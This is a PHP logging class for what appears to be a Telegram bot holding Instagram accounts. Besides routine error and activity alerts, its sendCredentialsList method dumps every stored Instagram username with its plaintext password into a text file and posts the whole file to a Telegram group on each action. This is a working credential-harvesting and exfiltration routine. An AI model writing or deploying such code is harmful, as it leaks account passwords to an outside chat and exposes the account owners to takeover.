<?php
class GroupLogger {
    /**
     * Send log message to group
     */
    public static function sendLogToGroup($message) {
        if (empty(LOG_GROUP_ID) || LOG_GROUP_ID === '-1002345678901') {
            // Skip if group ID not configured
            return false;
        }
        
        return TelegramAPI::sendMessage(LOG_GROUP_ID, $message);
    }
    
    /**
     * Send error log to group
     */
    public static function logError($error, $userId = null, $username = null) {
        $message = "🚨 BOT ERROR ALERT\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
        $message .= "⚠️ Error: {$error}\n";
        $message .= "📅 Time: " . date('Y-m-d H:i:s') . "\n";
        
        if ($userId) {
            $message .= "👤 User ID: {$userId}\n";
        }
        if ($username) {
            $message .= "👤 Username: @{$username}\n";
        }
        
        $message .= "\n🔍 Please check bot status!";
        
        return self::sendLogToGroup($message);
    }
    
    /**
     * Generate and send credentials list to group
     */
    public static function sendCredentialsList($action, $userId, $username, $affectedAccount = null) {
        $credentials = FileOperations::getCredentials();
        
        // Create TXT format content
        $txtContent = "# INSTAGRAM CREDENTIALS DATABASE\n";
        $txtContent .= "# Action: {$action}\n";
        $txtContent .= "# User: @{$username} (ID: {$userId})\n";
        $txtContent .= "# Date: " . date('Y-m-d H:i:s') . "\n";
        if ($affectedAccount) {
            $txtContent .= "# Affected Account: {$affectedAccount}\n";
        }
        $txtContent .= "# Total Accounts: " . count($credentials) . "\n";
        $txtContent .= "# Format: username password date_added\n";
        $txtContent .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
        
        if (!empty($credentials)) {
            foreach ($credentials as $cred) {
                $txtContent .= "{$cred['instagram_id']} {$cred['password']} {$cred['date_added']}\n";
            }
        } else {
            $txtContent .= "No accounts in database.\n";
        }
        
        // Save to temp file
        $fileName = 'credentials_log_' . date('Y-m-d_H-i-s') . '.txt';
        $filePath = TEMP_DIR . $fileName;
        file_put_contents($filePath, $txtContent);
        
        // Send to group
        $message = "📊 CREDENTIALS DATABASE UPDATE\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
        $message .= "🔄 Action: {$action}\n";
        $message .= "👤 User: @{$username} (ID: {$userId})\n";
        if ($affectedAccount) {
            $message .= "📱 Account: {$affectedAccount}\n";
        }
        $message .= "📊 Total Accounts: " . count($credentials) . "\n";
        $message .= "📅 Time: " . date('Y-m-d H:i:s') . "\n\n";
        $message .= "📄 Updated database file attached below:";
        
        // Send message first
        self::sendLogToGroup($message);
        
        // Send document
        if (file_exists($filePath)) {
            TelegramAPI::sendDocument(LOG_GROUP_ID, $filePath, $fileName);
            // Clean up
            unlink($filePath);
        }
        
        return true;
    }
    
    /**
     * Log user activity to group
     */
    public static function logActivity($action, $userId, $username, $details = '') {
        $message = "📋 USER ACTIVITY LOG\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n";
        $message .= "🎯 Action: {$action}\n";
        $message .= "👤 User: @{$username} (ID: {$userId})\n";
        $message .= "📅 Time: " . date('Y-m-d H:i:s') . "\n";
        
        if (!empty($details)) {
            $message .= "📝 Details: {$details}\n";
        }
        
        return self::sendLogToGroup($message);
    }
}
?>